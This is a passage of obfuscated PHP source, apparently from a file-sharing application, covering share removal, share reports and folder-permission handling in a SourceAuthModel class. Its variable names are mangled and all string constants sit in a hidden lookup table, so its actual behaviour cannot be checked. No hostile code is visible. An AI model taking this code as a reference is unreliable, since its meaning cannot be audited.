=& $_SERVER[Ì¥ŞÒ°£]; if (is_array($…´´ğ¿É)) { $…´´ğ¿É = array($Ş£æÔü[7], $…´´ğ¿É); } $ç•û¿Ï¬ = array($Ş£æÔü[489] => $…´´ğ¿É); $ÈÜÑÀ˜ı = $this->where($ç•û¿Ï¬)->delete(); if ($ÈÜÑÀ˜ı) { Model($Ş£æÔü[602])->where(array($Ş£æÔü[489] => $…´´ğ¿É))->delete(); } $Ÿôï…‘€ = is_array($…´´ğ¿É) ? $…´´ğ¿É[1] : array($…´´ğ¿É); for ($®½Ï¤Ÿê = 0; $®½Ï¤Ÿê < count($Ÿôï…‘€); $®½Ï¤Ÿê++) { $«Ñ¤¼óõ = $this->getInfo($Ÿôï…‘€[$®½Ï¤Ÿê]); if ($«Ñ¤¼óõ[$Ş£æÔü[496]] == $Ş£æÔü[88]) { Model($Ş£æÔü[570])->eventShare($«Ñ¤¼óõ[$Ş£æÔü[402]], $Ş£æÔü[2012]); } if ($«Ñ¤¼óõ[$Ş£æÔü[494]] == $Ş£æÔü[88]) { Model($Ş£æÔü[570])->eventShare($«Ñ¤¼óõ[$Ş£æÔü[402]], $Ş£æÔü[2011]); } } return $ÈÜÑÀ˜ı; } protected function removeBySource($æ²µ‹ûÃ) { $¤â„¯¦ =& $_SERVER[Ì¥ŞÒ°£]; $Í‡‘é £ = array($¤â„¯¦[417] => array($¤â„¯¦[418], $æ²µ‹ûÃ)); $ØÊÁÑÍß = $this->field($¤â„¯¦[489])->where($Í‡‘é £)->select(); $ØÊÁÑÍß = array_to_keyvalue($ØÊÁÑÍß, $¤â„¯¦[12], $¤â„¯¦[489]); if (!$ØÊÁÑÍß) { return; } $Í‡‘é £ = array($¤â„¯¦[488] => array($¤â„¯¦[418], $ØÊÁÑÍß)); $this->where($Í‡‘é £)->delete(); Model($¤â„¯¦[602])->where($Í‡‘é £)->delete(); } public function listAll($Ó½ªÔÑÀ) { $¢ÂÓˆÁæ =& $_SERVER[Ì¥ŞÒ°£]; $…ÉñûÚ = array(); if ($Ó½ªÔÑÀ[$¢ÂÓˆÁæ[1667]]) { $…ÉñûÚ[$¢ÂÓˆÁæ[1667]] = $Ó½ªÔÑÀ[$¢ÂÓˆÁæ[1667]]; } if ($Ó½ªÔÑÀ[$¢ÂÓˆÁæ[763]]) { $¡˜òÀ§½ = $Ó½ªÔÑÀ[$¢ÂÓˆÁæ[497]] ? $Ó½ªÔÑÀ[$¢ÂÓˆÁæ[497]] : strtotime(date($¢ÂÓˆÁæ[2024])); $…ÉñûÚ[$¢ÂÓˆÁæ[200]] = array($¢ÂÓˆÁæ[333], array($Ó½ªÔÑÀ[$¢ÂÓˆÁæ[763]], $¡˜òÀ§½)); } if ($Ó½ªÔÑÀ[$¢ÂÓˆÁæ[33]]) { $…ÉñûÚ[$Ó½ªÔÑÀ[$¢ÂÓˆÁæ[33]]] = 1; } else { $…ÉñûÚ[] = array($¢ÂÓˆÁæ[494] => array($¢ÂÓˆÁæ[1017], 0), $¢ÂÓˆÁæ[496] => array($¢ÂÓˆÁæ[1017], 0), $¢ÂÓˆÁæ[2001] => $¢ÂÓˆÁæ[1955]); } if ($Ó½ªÔÑÀ[$¢ÂÓˆÁæ[1951]]) { $…ÉñûÚ[] = array($¢ÂÓˆÁæ[491] => $Ó½ªÔÑÀ[$¢ÂÓˆÁæ[1951]], $¢ÂÓˆÁæ[1567] => array($¢ÂÓˆÁæ[383], "\45{$Ó½ªÔÑÀ[$¢ÂÓˆÁæ[1951]]}\x25"), $¢ÂÓˆÁæ[2001] => $¢ÂÓˆÁæ[1955]); } $Œş‹¨û = $this->_makeOrder()->where($…ÉñûÚ)->selectPage(20); if (empty($Œş‹¨û[$¢ÂÓˆÁæ[369]])) { return array(); } $this->_listDataApply($Œş‹¨û[$¢ÂÓˆÁæ[369]]); return $Œş‹¨û; } public function listDataApply($¥ı¯éâÊ) { $this->_listDataApply($¥ı¯éâÊ); return $¥ı¯éâÊ; } private function _listDataApply(&$À‹æñ¼é) { $µºüÒÔƒ =& $_SERVER[Ì¥ŞÒ°£]; $°ğ…Á×‚ = array_to_keyvalue($À‹æñ¼é, $µºüÒÔƒ[12], $µºüÒÔƒ[1667]); $ø¨¢Ÿ™ğ = Model($µºüÒÔƒ[535])->userListInfo(array_unique($°ğ…Á×‚)); $®Ôã¿é = array_to_keyvalue($À‹æñ¼é, $µºüÒÔƒ[12], $µºüÒÔƒ[402]); $Ğİç¡­„ = Model($µºüÒÔƒ[827])->sourceListInfo($®Ôã¿é, !0); foreach ($À‹æñ¼é as $Üª³¥µÚ => &$Æ¨üòü) { $ÅË˜ÊÓ = $Æ¨üòü[$µºüÒÔƒ[1667]]; $Æ¨üòü[$µºüÒÔƒ[2025]] = $ø¨¢Ÿ™ğ[$ÅË˜ÊÓ] ? $ø¨¢Ÿ™ğ[$ÅË˜ÊÓ] : !1; $½´¨¯½ = $Æ¨üòü[$µºüÒÔƒ[402]]; $Æ¨üòü[$µºüÒÔƒ[86]] = $Ğİç¡­„[$½´¨¯½] ? $Ğİç¡­„[$½´¨¯½] : !1; if ($Æ¨üòü[$µºüÒÔƒ[86]][$µºüÒÔƒ[431]] == $µºüÒÔƒ[88]) { unset($À‹æñ¼é[$Üª³¥µÚ]); } if ($Æ¨üòü[$µºüÒÔƒ[86]] != $µºüÒÔƒ[197] && !$Æ¨üòü[$µºüÒÔƒ[86]]) { unset($À‹æñ¼é[$Üª³¥µÚ]); } } unset($Æ¨üòü); $À‹æñ¼é = array_values($À‹æñ¼é); } private function _makeOrder($“€Şë¹ = '') { $ôâ¨¿€´ =& $_SERVER[Ì¥ŞÒ°£]; $ëŸàÉ©ä = array($ôâ¨¿€´[200], $ôâ¨¿€´[497], $ôâ¨¿€´[2014], $ôâ¨¿€´[2015]); $ÜÃœ°• = array($ôâ¨¿€´[450] => $ôâ¨¿€´[451], $ôâ¨¿€´[452] => $ôâ¨¿€´[453]); $›Åß—ã§ = Input::get($ôâ¨¿€´[457], $ôâ¨¿€´[7], $ôâ¨¿€´[423], $ëŸàÉ©ä); $İ¼ïå¬¿ = Input::get($ôâ¨¿€´[458], $ôâ¨¿€´[7], $ôâ¨¿€´[2026], array($ôâ¨¿€´[1948], $ôâ¨¿€´[452])); $İ¼ïå¬¿ = $ÜÃœ°•[$İ¼ïå¬¿]; $“€Şë¹ = $“€Şë¹ . "{$›Åß—ã§}\40{$İ¼ïå¬¿}"; return $this->order($“€Şë¹); } public function reportAdd($ê›‘ß–­) { $ÜŠµæ¬‚ =& $_SERVER[Ì¥ŞÒ°£]; $Ìóô¾ = array($ÜŠµæ¬‚[489] => $ê›‘ß–­[$ÜŠµæ¬‚[489]], $ÜŠµæ¬‚[1667] => USER_ID); if (Model($ÜŠµæ¬‚[2022])->where($Ìóô¾)->find()) { return !1; } $ß ŠÕ™¡ = array($ÜŠµæ¬‚[489] => $ê›‘ß–­[$ÜŠµæ¬‚[489]], $ÜŠµæ¬‚[1567] => $ê›‘ß–­[$ÜŠµæ¬‚[1567]], $ÜŠµæ¬‚[402] => $ê›‘ß–­[$ÜŠµæ¬‚[402]], $ÜŠµæ¬‚[468] => $ê›‘ß–­[$ÜŠµæ¬‚[468]], $ÜŠµæ¬‚[1667] => USER_ID, $ÜŠµæ¬‚[33] => $ê›‘ß–­[$ÜŠµæ¬‚[33]], $ÜŠµæ¬‚[453] => $ê›‘ß–­[$ÜŠµæ¬‚[453]]); return Model($ÜŠµæ¬‚[2022])->add($ß ŠÕ™¡); } public function reportList($äÂ İÖó) { $œõ²äœ¹ =& $_SERVER[Ì¥ŞÒ°£]; $Šéåİ€ = array(); if ($äÂ İÖó[$œõ²äœ¹[763]]) { $»°É™íœ = $äÂ İÖó[$œõ²äœ¹[497]] ? $äÂ İÖó[$œõ²äœ¹[497]] : strtotime(date($œõ²äœ¹[2024])); $Šéåİ€[$œõ²äœ¹[200]] = array($œõ²äœ¹[333], array($äÂ İÖó[$œõ²äœ¹[763]], $»°É™íœ)); } if (isset($äÂ İÖó[$œõ²äœ¹[33]]) && in_array($äÂ İÖó[$œõ²äœ¹[33]], array($œõ²äœ¹[88], $œõ²äœ¹[437], $œõ²äœ¹[2027], $œõ²äœ¹[2028], $œõ²äœ¹[2029]))) { $Šéåİ€[$œõ²äœ¹[33]] = $äÂ İÖó[$œõ²äœ¹[33]]; } if (isset($äÂ İÖó[$œõ²äœ¹[752]]) && in_array($äÂ İÖó[$œõ²äœ¹[752]], array($œõ²äœ¹[197], $œõ²äœ¹[88], $œõ²äœ¹[437], $œõ²äœ¹[2027]))) { $Šéåİ€[$œõ²äœ¹[752]] = $äÂ İÖó[$œõ²äœ¹[752]]; } $¶ç³™œ± = Input::get($œõ²äœ¹[458], $œõ²äœ¹[7], $œõ²äœ¹[2026], array($œõ²äœ¹[1948], $œõ²äœ¹[452])); $­•ú¢º• = array($œõ²äœ¹[450] => $œõ²äœ¹[451], $œõ²äœ¹[452] => $œõ²äœ¹[453]); $™÷‹ìÚô = $œõ²äœ¹[2030] . $­•ú¢º•[$¶ç³™œ±]; $ŞÓ¿Øäê = Model($œõ²äœ¹[2022])->where($Šéåİ€)->order($™÷‹ìÚô)->selectPage(20); if (empty($ŞÓ¿Øäê[$œõ²äœ¹[369]])) { return array(); } $Ö°Áæ = array_to_keyvalue_group($ŞÓ¿Øäê[$œõ²äœ¹[369]], $œõ²äœ¹[752], $œõ²äœ¹[489]); if (!empty($Ö°Áæ[0])) { $äÂ İÖó = $Ö°Áæ[0]; $Šéåİ€ = array($œõ²äœ¹[489] => array($œõ²äœ¹[7], $äÂ İÖó)); $¬Ä”¢Çğ = $this->where($Šéåİ€)->field($œõ²äœ¹[489])->select(); $¬Ä”¢Çğ = array_to_keyvalue($¬Ä”¢Çğ, $œõ²äœ¹[12], $œõ²äœ¹[489]); $×ã¶¼å§ = array_diff($äÂ İÖó, $¬Ä”¢Çğ); if (!empty($×ã¶¼å§)) { foreach ($ŞÓ¿Øäê[$œõ²äœ¹[369]] as $‰Î¢£Á => $€÷øØ Ğ) { if (in_array($€÷øØ Ğ[$œõ²äœ¹[489]], $×ã¶¼å§)) { unset($ŞÓ¿Øäê[$œõ²äœ¹[369]][$‰Î¢£Á]); } } } } $this->_listDataApply($ŞÓ¿Øäê[$œõ²äœ¹[369]]); return $ŞÓ¿Øäê; } public function reportStatus($ÆÎ¦ĞâÒ) { $ùµèÒ   =& $_SERVER[Ì¥ŞÒ°£]; $¼šùğ´º = array($ùµèÒ  [399] => $ÆÎ¦ĞâÒ[$ùµèÒ  [399]]); $¼ü½Ù¿ = Model($ùµèÒ  [2022])->where($¼šùğ´º)->field($ùµèÒ  [2031])->find(); if (!$¼ü½Ù¿) { return !1; } $ûŠ¡“²· = array($ùµèÒ  [752] => $ÆÎ¦ĞâÒ[$ùµèÒ  [752]]); if ($ÆÎ¦ĞâÒ[$ùµèÒ  [752]] == $ùµèÒ  [2027] && $¼ü½Ù¿[$ùµèÒ  [752]] == $ùµèÒ  [2027]) { $ûŠ¡“²·[$ùµèÒ  [752]] = 0; } $†ç‰§¿š = Model($ùµèÒ  [2022])->where($¼šùğ´º)->save($ûŠ¡“²·); if ($ÆÎ¦ĞâÒ[$ùµèÒ  [752]] == $ùµèÒ  [437]) { if ($¼ü½Ù¿[$ùµèÒ  [468]] != $ùµèÒ  [197] && $this->shareFileMeta($¼ü½Ù¿[$ùµèÒ  [468]])) { $this->shareFileMeta($¼ü½Ù¿[$ùµèÒ  [468]], 0); } $this->remove($¼ü½Ù¿[$ùµèÒ  [489]]); return !0; } if ($†ç‰§¿š && $ÆÎ¦ĞâÒ[$ùµèÒ  [752]] == $ùµèÒ  [2027]) { $Ù‘ø‡‰ = $ûŠ¡“²·[$ùµèÒ  [752]] == $ùµèÒ  [2027] ? 1 : 0; $this->shareFileMeta($¼ü½Ù¿[$ùµèÒ  [468]], $Ù‘ø‡‰); $this->removeByFile($¼ü½Ù¿[$ùµèÒ  [468]]); } return $†ç‰§¿š; } private function removeByFile($°­çÒ ) { $«âÓ„š¢ =& $_SERVER[Ì¥ŞÒ°£]; $÷ı¾Ò£¼ = Model($«âÓ„š¢[827])->where(array($«âÓ„š¢[468] => $°­çÒ ))->field($«âÓ„š¢[402])->select(); $¯ÍÜÒÒÆ = array_to_keyvalue($÷ı¾Ò£¼, $«âÓ„š¢[12], $«âÓ„š¢[402]); $œ…à¸¶³ = array($«âÓ„š¢[402] => array($«âÓ„š¢[7], $¯ÍÜÒÒÆ), $«âÓ„š¢[494] => 1); $÷ı¾Ò£¼ = $this->where($œ…à¸¶³)->field($«âÓ„š¢[489])->select(); if (empty($÷ı¾Ò£¼)) { return; } $„è¶ë‚” = array_to_keyvalue($÷ı¾Ò£¼, $«âÓ„š¢[12], $«âÓ„š¢[489]); $this->remove($„è¶ë‚”); } private function shareFileMeta($¼Ç”Úöœ, $§Ş¢ãù = null) { $ˆ÷¿“€ =& $_SERVER[Ì¥ŞÒ°£]; $ŸÒæå¨ = array($ˆ÷¿“€[468] => $¼Ç”Úöœ, $ˆ÷¿“€[94] => $ˆ÷¿“€[2032]); if (is_null($§Ş¢ãù)) { return Model($ˆ÷¿“€[2033])->where($ŸÒæå¨)->find(); } $ŸÒæå¨[$ˆ÷¿“€[374]] = $§Ş¢ãù; Model($ˆ÷¿“€[2033])->add($ŸÒæå¨, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\162\143\145\137\x61\x75\x74\150"; public function getAuth($¬øÎÁ¬¯) { $ñü†­²œ =& $_SERVER[Ì¥ŞÒ°£]; $Ã‚’üö = $this->sourceAuthSelect($¬øÎÁ¬¯); $ı©¬÷Ò® = array(); $­ÔÆé“Ğ = array(); $õÈÉ = 2 << 25; foreach ($Ã‚’üö as $­ƒ¢òı) { $ùä–¢œ = Model($ñü†­²œ[507])->listData($­ƒ¢òı[$ñü†­²œ[1961]]); if (!$ùä–¢œ) { continue; } $ı©¬÷Ò®[] = $­ƒ¢òı; $††°áğ† = 0; if ($­ƒ¢òı[$ñü†­²œ[411]] == SourceModel::TYPE_GROUP) { $††°áğ† = $õÈÉ * 2; } if ($­ƒ¢òı[$ñü†­²œ[411]] == SourceModel::TYPE_USER) { $††°áğ† = $õÈÉ; } if ($­ƒ¢òı[$ñü†­²œ[411]] == SourceModel::TYPE_USER && $­ƒ¢òı[$ñü†­²œ[505]] == $ñü†­²œ[197]) { $††°áğ† = 0; } $­ÔÆé“Ğ[] = $ùä–¢œ[$ñü†­²œ[413]] + $††°áğ†; } array_multisort($­ÔÆé“Ğ, SORT_DESC, $ı©¬÷Ò®); return $ı©¬÷Ò®; } public function sourceAuthSelect($Ì÷Ğ­Â) { $²œã÷Ù =& $_SERVER[Ì¥ŞÒ°£]; static $á÷‚È—Ë = array(); $–Øïø—‘ = is_array($Ì÷Ğ­Â) ? !1 : !0; if ($–Øïø—‘) { $Ì÷Ğ­Â = array($Ì÷Ğ­Â); } $¨—ªäÇ™ = array(); foreach ($Ì÷Ğ­Â as $¨ìĞ“©¨) { if (isset($á÷‚È—Ë[$¨ìĞ“©¨])) { $¨—ªäÇ™[$¨ìĞ“©¨] = $á÷‚È—Ë[$¨ìĞ“©¨]; } } if (count($¨—ªäÇ™) == count($Ì÷Ğ­Â)) { return $–Øïø—‘ ? $¨—ªäÇ™[$Ì÷Ğ­Â[0]] : $¨—ªäÇ™; } $ƒ‘Ëáô = $²œã÷Ù[2034]; $­•û†¾„ = array($²œã÷Ù[402] => array($²œã÷Ù[7], $Ì÷Ğ­Â)); $Æ…ØÔ² = $this->field($ƒ‘Ëáô)->order($²œã÷Ù[399])->where($­•û†¾„)->select(); $Ï¶à¨¿‹ = array_to_keyvalue_group($Æ…ØÔ², $²œã÷Ù[402]); foreach ($Ì÷Ğ­Â as $¨ìĞ“©¨) { $á÷‚È—Ë[$¨ìĞ“©¨] = $Ï¶à¨¿‹[$¨ìĞ“©¨] ? $Ï¶à¨¿‹[$¨ìĞ“©¨] : array(); } if ($–Øïø—‘) { return $Æ…ØÔ²; } return $Ï¶à¨¿‹; } public function setAuth($¨Ñ¿À¸…, $İ‹¤½º) { $ÒÅİ“İ =& $_SERVER[Ì¥ŞÒ°£]; $êú…Ÿ£ = Model($ÒÅİ“İ[1341])->sourceInfo($¨Ñ¿À¸…); if (!$êú…Ÿ£) { return !1; } if ($êú…Ÿ£[$ÒÅİ“İ[411]] != SourceModel::TYPE_GROUP) { return !1; } $ªâ‚šÛ˜ = 1; $ÌÂØö = $êú…Ÿ£[$ÒÅİ“İ[505]]; if ($ÌÂØö != $ªâ‚šÛ˜) { $Åä¢•‰ö = array($ÒÅİ“İ[1857] => $ÌÂØö); $“ËµüˆÉ = Model($ÒÅİ“İ[1947])->field($ÒÅİ“İ[1667])->where($Åä¢•‰ö)->select(); $“ËµüˆÉ = array_to_keyvalue($“ËµüˆÉ, $ÒÅİ“İ[12], $ÒÅİ“İ[1667]); } $¾ŠÏÁ² = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ã—´ãÂª = array(); foreach ($İ‹¤½º as $£¯¿É³Ç) { if (!in_array($£¯¿É³Ç[$ÒÅİ“İ[411]], $¾ŠÏÁ²)) { show_json(LNG($ÒÅİ“İ[2035]), !1); } if ($ÌÂØö != $ªâ‚šÛ˜) { if ($£¯¿É³Ç[$ÒÅİ“İ[411]] == SourceModel::TYPE_GROUP) { } if ($£¯¿É³Ç[$ÒÅİ“İ[505]] != 0 && !in_array($£¯¿É³Ç[$ÒÅİ“İ[505]], $“ËµüˆÉ)) { } } if ($£¯¿É³Ç[$ÒÅİ“İ[505]] == 0) { $£¯¿É³Ç[$ÒÅİ“İ[411]] = SourceModel::TYPE_USER; } $Ã—´ãÂª[] = array($ÒÅİ“İ[402] => $¨Ñ¿À¸…, $ÒÅİ“İ[411] => intval($£¯¿É³Ç[$ÒÅİ“İ[411]]), $ÒÅİ“İ[505] => intval($£¯¿É³Ç[$ÒÅİ“İ[505]]), $ÒÅİ“İ[1961] => intval($£¯¿É³Ç[$ÒÅİ“İ[1961]]) ? intval($£¯¿É³Ç[$ÒÅİ“İ[1961]]) : 0, $ÒÅİ“İ[2017] => intval($£¯¿É³Ç[$ÒÅİ“İ[2017]]) ? intval($£¯¿É³Ç[$ÒÅİ“İ[2017]]) : -1); } $this->where(array($ÒÅİ“İ[417] => $¨Ñ¿À¸…))->delete(); $this->addAll($Ã—´ãÂª); return !0; } public function authClear($·ïóÎº) { $ëùÂ´³¯ =& $_SERVER[Ì¥ŞÒ°£]; $’ÛÖüˆó = Model($ëùÂ´³¯[1341])->sourceInfo($·ïóÎº); $áà‘ğ„Û = array($·ïóÎº); if ($’ÛÖüˆó[$ëùÂ´³¯[410]] == $ëùÂ´³¯[88]) { $Õ•ıûÇà = array($ëùÂ´³¯[590] => array($ëùÂ´³¯[550], $’ÛÖüˆó[$ëùÂ´³¯[521]] . $·ïóÎº . $ëùÂ´³¯[551])); $áà‘ğ„Û = Model($ëùÂ´³¯[1341])->field($ëùÂ´³¯[417])->where($Õ•ıûÇà)->getField($ëùÂ´³¯[402], !0); $áà‘ğ„Û[] = $·ïóÎº; } $this->where(array($ëùÂ´³¯[417] => array($ëùÂ´³¯[418], $áà‘ğ„Û)))->delete(); return !0; } public function getAllChildren($ö“Ê¨šÛ) { $…ûŒÍÌæ =& $_SERVER[Ì¥ŞÒ°£]; $Î ›¶ò» = Model($…ûŒÍÌæ[1341])->sourceInfo($ö“Ê¨šÛ); if ($Î ›¶ò»[$…ûŒÍÌæ[410]] != $…ûŒÍÌæ[88]) { return $this->sourceListAuth(array($ö“Ê¨šÛ)); } if ($Î ›¶ò»[$…ûŒÍÌæ[411]] != SourceModel::TYPE_GROUP) { return array(); } $ñ©›õé¢ = 1; $·…ÅÍ = array($ö“Ê¨šÛ); if ($Î ›¶ò»[$…ûŒÍÌæ[432]] == $…ûŒÍÌæ[197] && $Î ›¶ò»[$…ûŒÍÌæ[505]] != $ñ©›õé¢) { $·…ÅÍ = $this->groupChidldAllRootSource($Î ›¶ò»[$…ûŒÍÌæ[505]]); } $¿÷§íùô = $this->field($…ûŒÍÌæ[402])->group($…ûŒÍÌæ[402])->select(); $¿÷§íùô = array_to_keyvalue($¿÷§íùô, $…ûŒÍÌæ[12], $…ûŒÍÌæ[402]); if (!$¿÷§íùô) { return array(); } $ŸÊØ—ˆç = $…ûŒÍÌæ[2036]; $Ÿ¸™ÜÀ§ = array($…ûŒÍÌæ[402] => array($…ûŒÍÌæ[7], $¿÷§íùô), $…ûŒÍÌæ[431] => $…ûŒÍÌæ[197]); $ÎĞÀƒ‡Â = Model($…ûŒÍÌæ[827])->field($ŸÊØ—ˆç)->where($Ÿ¸™ÜÀ§)->select(); $ÉÆ º« = array($ö“Ê¨šÛ); foreach ($ÎĞÀƒ‡Â as $ÔÆ­Ü„‹) { foreach ($·…ÅÍ as $ğ™Ñô¬©) { $Ñ×³êÓ‚ = $…ûŒÍÌæ[50] . $ğ™Ñô¬© . $…ûŒÍÌæ[50]; $šä¨£ñ¨ = $ÔÆ­Ü„‹[$…ûŒÍÌæ[521]] . $ÔÆ­Ü„‹[$…ûŒÍÌæ[402]] . $…ûŒÍÌæ[50]; if (strstr($šä¨£ñ¨, $Ñ×³êÓ‚)) { $ÉÆ º«[] = $ÔÆ­Ü„‹[$…ûŒÍÌæ[402]]; break; } } } return $this->sourceListAuth($ÉÆ º«); } private function sourceListAuth($¤üÔş°½) { $ş»î®Ø =& $_SERVER[Ì¥ŞÒ°£]; $™ü«âê¡ = Model($ş»î®Ø[1341])->sourceListInfo($¤üÔş°½, !0); $¢¥½œ³´ = $this->sourceAuthSelect($¤üÔş°½); $Ñû£Á¾¸ = array(); $ÉÓÃƒĞû = array(); foreach ($™ü«âê¡ as $ÙóÓ ‡) { unset($ÙóÓ ‡[$ş»î®Ø[456]]); unset($ÙóÓ ‡[$ş»î®Ø[454]]); unset($ÙóÓ ‡[$ş»î®Ø[413]]); unset($ÙóÓ ‡[$ş»î®Ø[86]]); $›ÛÇ¡ô‰ = $¢¥½œ³´[$ÙóÓ ‡[$ş»î®Ø[402]]]; if (!$›ÛÇ¡ô‰) { continue; } $ÙóÓ ‡[$ş»î®Ø[2037]] = $this->authTargetInfo($›ÛÇ¡ô‰); $ÙóÓ ‡[$ş»î®Ø[519]] = rtrim($ÙóÓ ‡[$ş»î®Ø[525]], $ş»î®Ø[8]) . $ş»î®Ø[8] . ltrim($ÙóÓ ‡[$ş»î®Ø[519]], $ş»î®Ø[8]); $Ñû£Á¾¸[] = $ÙóÓ ‡; $âÖäº = count(explode($ş»î®Ø[8], trim($ÙóÓ ‡[$ş»î®Ø[519]], $ş»î®Ø[8]))); $ÉÓÃƒĞû[] = $âÖäº + ($ÙóÓ ‡[$ş»î®Ø[33]] == $ş»î®Ø[75] ? 0 : 1000); } array_multisort($ÉÓÃƒĞû, SORT_ASC, $Ñû£Á¾¸); return $Ñû£Á¾¸; } private function groupChidldAllRootSource($·¬ˆ•ç) { $æâù©ÜË =& $_SERVER[Ì¥ŞÒ°£]; $óÖÏ«ğÊ = Model($æâù©ÜË[2038])->groupChildrenAll($·¬ˆ•ç); $½’é¶¸Ù = array($æâù©ÜË[432] => 0, $æâù©ÜË[505] => array($æâù©ÜË[7], $óÖÏ«ğÊ), $æâù©ÜË[411] => SourceModel::TYPE_GROUP); $©íê“Şø = Model($æâù©ÜË[827])->field($æâù©ÜË[402])->where($½’é¶¸Ù)->select(); $©íê“Şø = array_to_keyvalue($©íê“Şø, $æâù©ÜË[12], $æâù©ÜË[402]); return $©íê“Şø; } private function authTargetInfo($çªÕø¸…) { $§ò©ë‡â =& $_SERVER[Ì¥ŞÒ°£]; $´ÄÑ§ = array(); $½ÔŸÔ¦Ó = array(); $ïæ¶çç = 2 << 25; foreach ($çªÕø¸… as $ä¥‹İöĞ) { $ÃŞ€¶¾« = Model($§ò©ë‡â[507])->listData($ä¥‹İöĞ[$§ò©ë‡â[1961]]); if (!$ÃŞ€¶¾«) { continue; } if ($ä¥‹İöĞ[$§ò©ë‡â[411]] == SourceModel::TYPE_USER) { $ğÁ†ˆÎ¢ = Model($§ò©ë‡â[513])->getInfoSimpleOuter($ä¥‹İöĞ[$§ò©ë‡â[505]]); if ($ğÁ†ˆÎ¢[$§ò©ë‡â[1667]] == $§ò©ë‡â[1194]) { continue; } if ($ğÁ†ˆÎ¢[$§ò©ë‡â[1667]] == $§ò©ë‡â[197]) { $ğÁ†ˆÎ¢[$§ò©ë‡â[32]] = LNG($§ò©ë‡â[2039]); } } else { $ğÁ†ˆÎ¢ = Model($§ò©ë‡â[522])->getInfoSimple($ä¥‹İöĞ[$§ò©ë‡â[505]]); } if (!$ğÁ†ˆÎ¢) { continue; } $ğÁ†ˆÎ¢[$§ò©ë‡â[467]] = $ÃŞ€¶¾«; $´ÄÑ§[] = $ğÁ†ˆÎ¢; $¦Œ™â×† = 0; if ($ä¥‹İöĞ[$§ò©ë‡â[411]] == SourceModel::TYPE_GROUP) { $¦Œ™â×† = $ïæ¶çç * 2; } if ($ä¥‹İöĞ[$§ò©ë‡â[411]] == SourceModel::TYPE_USER) { $¦Œ™â×† = $ïæ¶çç; } if ($ä¥‹İöĞ[$§ò©ë‡â[411]] == SourceModel::TYPE_USER && $ä¥‹İöĞ[$§ò©ë‡â[505]] == $§ò©ë‡â[197]) { $¦Œ™â×† = 0; } $½ÔŸÔ¦Ó[] = $ÃŞ€¶¾«[$§ò©ë‡â[413]] + $¦Œ™â×†; } array_multisort($½ÔŸÔ¦Ó, SORT_DESC, $´ÄÑ§); return $´ÄÑ§; } public function getAllChildrenByUser($Îü÷¥óÖ, $°Ì·èœ) { $ËñÍÀÙ =& $_SERVER[Ì¥ŞÒ°£]; $Šñá ƒœ = Model($ËñÍÀÙ[535])->getInfo($°Ì·èœ); if (!$°Ì·èœ || !$Îü÷¥óÖ || !$Šñá ƒœ) { return array(); } $­ŞÎÂ»Ï = Model($ËñÍÀÙ[1341])->sourceInfo($Îü÷¥óÖ); $†…ÄŠ€¾ = array(); $ü‡…Î = 1; if ($­ŞÎÂ»Ï[$ËñÍÀÙ[432]] == $ËñÍÀÙ[197] && $­ŞÎÂ»Ï[$ËñÍÀÙ[505]] != $ü‡…Î && $this->groupContainUser($­ŞÎÂ»Ï[$ËñÍÀÙ[505]], $°Ì·èœ)) { foreach ($Šñá ƒœ[$ËñÍÀÙ[2040]] as $Ú¶ªÅúô) { $àğ³„Üµ = Model($ËñÍÀÙ[522])->getInfo($Ú¶ªÅúô[$ËñÍÀÙ[1857]]); $éø€õ = Model($ËñÍÀÙ[535])->getInfoSimpleOuter($°Ì·èœ); $éø€õ[$ËñÍÀÙ[467]] = $Ú¶ªÅúô[$ËñÍÀÙ[413]]; if (Model($ËñÍÀÙ[507])->authCheckAction($Ú¶ªÅúô[$ËñÍÀÙ[413]][$ËñÍÀÙ[413]], $ËñÍÀÙ[1878])) { continue; } $š•”®É = array($ËñÍÀÙ[32] => $ËñÍÀÙ[1214] . $àğ³„Üµ[$ËñÍÀÙ[32]], $ËñÍÀÙ[402] => $àğ³„Üµ[$ËñÍÀÙ[86]][$ËñÍÀÙ[402]], $ËñÍÀÙ[84] => KodIO::make($àğ³„Üµ[$ËñÍÀÙ[86]][$ËñÍÀÙ[402]]), $ËñÍÀÙ[432] => $ËñÍÀÙ[197], $ËñÍÀÙ[411] => $ËñÍÀÙ[515], $ËñÍÀÙ[33] => $ËñÍÀÙ[554], $ËñÍÀÙ[519] => $àğ³„Üµ[$ËñÍÀÙ[526]], $ËñÍÀÙ[1857] => $àğ³„Üµ[$ËñÍÀÙ[1857]], $ËñÍÀÙ[523] => $àğ³„Üµ[$ËñÍÀÙ[432]], $ËñÍÀÙ[2037] => array($éø€õ)); $†…ÄŠ€¾[$š•”®É[$ËñÍÀÙ[402]]] = $š•”®É; } } $¸á´àÁê = array(); $ä—¨™èÎ = $this->getAllChildren($Îü÷¥óÖ); foreach ($ä—¨™èÎ as $ÈœĞ»½) { $ÏÂ®Â› = !1; foreach ($ÈœĞ»½[$ËñÍÀÙ[2037]] as $©˜ŞÚÕ) { if ($©˜ŞÚÕ[$ËñÍÀÙ[1667]]) { if ($©˜ŞÚÕ[$ËñÍÀÙ[1667]] == $°Ì·èœ) { $ÏÂ®Â› = !0; break; } } if ($©˜ŞÚÕ[$ËñÍÀÙ[1857]]) { if ($this->groupContainUser($©˜ŞÚÕ[$ËñÍÀÙ[1857]], $°Ì·èœ)) { $ÏÂ®Â› = !0; break; } } } if ($ÏÂ®Â›) { $¸á´àÁê[] = $ÈœĞ»½; } $£èÏğ©’ = $ÈœĞ»½[$ËñÍÀÙ[402]]; if (isset($†…ÄŠ€¾[$£èÏğ©’])) { $ÈœĞ»½[$ËñÍÀÙ[2037]][] = $†…ÄŠ€¾[$£èÏğ©’][0]; $†…ÄŠ€¾[$£èÏğ©’] = !1; } } $†…ÄŠ€¾ = array_filter(array_values($†…ÄŠ€¾)); $¸á´àÁê = array_merge($†…ÄŠ€¾, $¸á´àÁê); return $¸á´àÁê; } public function setAllChildrenByUser($ïÃŸ³Úç, $¦ëÁ×·, $ì«îæÌü) { $ºœ•Ïú‚ =& $_SERVER[Ì¥ŞÒ°£]; $ù‘“àäô = $this->getAllChildrenByUser($ïÃŸ³Úç, $¦ëÁ×·); if (!$ì«îæÌü || !$ù‘“àäô) { return !1; } foreach ($ù‘“àäô as $ê´àèğ¥) { $»Åãß—ì = array(); foreach ($ê´àèğ¥[$ºœ•Ïú‚[2037]] as $‡•¦À±) { $‹ûèá³ = $‡•¦À±[$ºœ•Ïú‚[467]]; $Îõ¢à—Ø = 